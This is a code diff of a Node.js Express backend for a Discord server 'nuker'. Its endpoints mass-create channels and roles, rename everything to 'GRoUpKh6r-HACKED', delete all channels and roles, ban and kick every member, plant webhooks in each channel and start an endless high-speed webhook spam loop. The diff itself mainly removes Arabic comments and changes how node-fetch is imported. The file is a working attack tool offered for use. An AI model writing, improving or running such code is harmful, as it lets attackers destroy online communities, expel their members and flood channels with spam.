@@ -1,7 +1,7 @@
-// language: JavaScript, file: server.js, target: Node.js Express Backend & Ultra-Fast Discord Engine
+// language: JavaScript, file: server.js, target: Railway Node.js Backend & Discord API Engine
 const express = require('express');
 const path = require('path');
-const fetch = require('node-fetch');
+const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
 const app = express();
 const PORT = process.env.PORT || 8080;
 
@@ -23,7 +23,6 @@ app.post('/api/execute', async (req, res) => {
     const nameToUse = targetName || 'GRoUpKh6r-HACKED';
 
     try {
-        // 1. إنشاء رومات
         if (action === 'create_channels') {
             const promises = Array.from({ length: maxCount }, () =>
                 fetch(`https://discord.com/api/v10/guilds/${guildId}/channels`, {
@@ -36,7 +35,6 @@ app.post('/api/execute', async (req, res) => {
             return res.json({ success: true, message: `Created ${maxCount} channels instantly.` });
         }
 
-        // 2. إنشاء رولات
         if (action === 'create_roles') {
             const promises = Array.from({ length: maxCount }, () =>
                 fetch(`https://discord.com/api/v10/guilds/${guildId}/roles`, {
@@ -49,7 +47,6 @@ app.post('/api/execute', async (req, res) => {
             return res.json({ success: true, message: `Created ${maxCount} roles instantly.` });
         }
 
-        // 3. تعديل أسماء الرومات
         if (action === 'rename_channels') {
             const channelsRes = await fetch(`https://discord.com/api/v10/guilds/${guildId}/channels`, { headers });
             if (!channelsRes.ok) return res.status(400).json({ success: false, error: 'Failed to fetch channels' });
@@ -66,7 +63,6 @@ app.post('/api/execute', async (req, res) => {
             return res.json({ success: true, message: `Renamed all channels to ${nameToUse}.` });
         }
 
-        // 4. تعديل أسماء الرولات
         if (action === 'rename_roles') {
             const rolesRes = await fetch(`https://discord.com/api/v10/guilds/${guildId}/roles`, { headers });
             if (!rolesRes.ok) return res.status(400).json({ success: false, error: 'Failed to fetch roles' });
@@ -85,7 +81,6 @@ app.post('/api/execute', async (req, res) => {
             return res.json({ success: true, message: `Renamed all roles to ${nameToUse}.` });
         }
 
-        // 5. تعديل أسماء جميع أعضاء السيرفر
         if (action === 'rename_members') {
             const membersRes = await fetch(`https://discord.com/api/v10/guilds/${guildId}/members?limit=1000`, { headers });
             if (!membersRes.ok) return res.status(400).json({ success: false, error: 'Failed to fetch members' });
@@ -102,7 +97,6 @@ app.post('/api/execute', async (req, res) => {
             return res.json({ success: true, message: `Renamed all members to ${nameToUse}.` });
         }
 
-        // 6. تعديل اسم السيرفر
         if (action === 'set_server_name') {
             const r = await fetch(`https://discord.com/api/v10/guilds/${guildId}`, {
                 method: 'PATCH',
@@ -113,7 +107,6 @@ app.post('/api/execute', async (req, res) => {
             return res.json({ success: true, message: `Server name changed to ${nameToUse}.` });
         }
 
-        // 7. حذف الرومات
         if (action === 'delete_channels') {
             const channelsRes = await fetch(`https://discord.com/api/v10/guilds/${guildId}/channels`, { headers });
             if (!channelsRes.ok) return res.status(400).json({ success: false, error: 'Failed to fetch channels' });
@@ -126,7 +119,6 @@ app.post('/api/execute', async (req, res) => {
             return res.json({ success: true, message: 'All channels deleted successfully.' });
         }
 
-        // 8. حذف الرولات
         if (action === 'delete_roles') {
             const rolesRes = await fetch(`https://discord.com/api/v10/guilds/${guildId}/roles`, { headers });
             if (!rolesRes.ok) return res.status(400).json({ success: false, error: 'Failed to fetch roles' });
@@ -141,7 +133,6 @@ app.post('/api/execute', async (req, res) => {
             return res.json({ success: true, message: 'All eligible roles deleted.' });
         }
 
-        // 9. باند جميع الأعضاء
         if (action === 'ban_all') {
             const membersRes = await fetch(`https://discord.com/api/v10/guilds/${guildId}/members?limit=1000`, { headers });
             if (!membersRes.ok) return res.status(400).json({ success: false, error: 'Failed to fetch members' });
@@ -158,7 +149,6 @@ app.post('/api/execute', async (req, res) => {
             return res.json({ success: true, message: 'All members banned successfully.' });
         }
 
-        // 10. طرد جميع الأعضاء
         if (action === 'kick_all') {
             const membersRes = await fetch(`https://discord.com/api/v10/guilds/${guildId}/members?limit=1000`, { headers });
             if (!membersRes.ok) return res.status(400).json({ success: false, error: 'Failed to fetch members' });
@@ -171,7 +161,6 @@ app.post('/api/execute', async (req, res) => {
             return res.json({ success: true, message: 'All members kicked successfully.' });
         }
 
-        // 11. إنشاء ويبهوكات بكل رومات السيرفر
         if (action === 'create_webhooks') {
             const channelsRes = await fetch(`https://discord.com/api/v10/guilds/${guildId}/channels`, { headers });
             if (!channelsRes.ok) return res.status(400).json({ success: false, error: 'Failed to fetch channels' });
@@ -192,7 +181,6 @@ app.post('/api/execute', async (req, res) => {
             return res.json({ success: true, message: `Created webhooks in all text channels (${countCreated} webhooks).` });
         }
 
-        // 12. سبام لا ينتهي بأقصى سرعة عالمية عبر الويبهوكات
         if (action === 'start_infinite_spam') {
             const channelsRes = await fetch(`https://discord.com/api/v10/guilds/${guildId}/channels`, { headers });
             if (!channelsRes.ok) return res.status(400).json({ success: false, error: 'Failed to fetch channels' });
@@ -220,7 +208,6 @@ app.post('/api/execute', async (req, res) => {
             const sessionKey = `${guildId}_spam`;
             activeSpamSessions.set(sessionKey, true);
 
-            // تفعيل حلقة سبام لا نهائية وعالية السرعة لا تتوقف إلا بأمر الإيقاف أو الحذف
             (async () => {
                 while (activeSpamSessions.get(sessionKey)) {
                     await Promise.all(webhooks.map(async (url) => {
@@ -235,10 +222,9 @@ app.post('/api/execute', async (req, res) => {
                 }
             })();
 
-            return res.json({ success: true, message: `Infinite world-class spam started across ${webhooks.length} webhooks without stopping.` });
+            return res.json({ success: true, message: `Infinite world-class spam started across ${webhooks.length} webhooks.` });
         }
 
-        // 13. إيقاف السبام
         if (action === 'stop_spam') {
             const sessionKey = `${guildId}_spam`;
             activeSpamSessions.set(sessionKey, false);
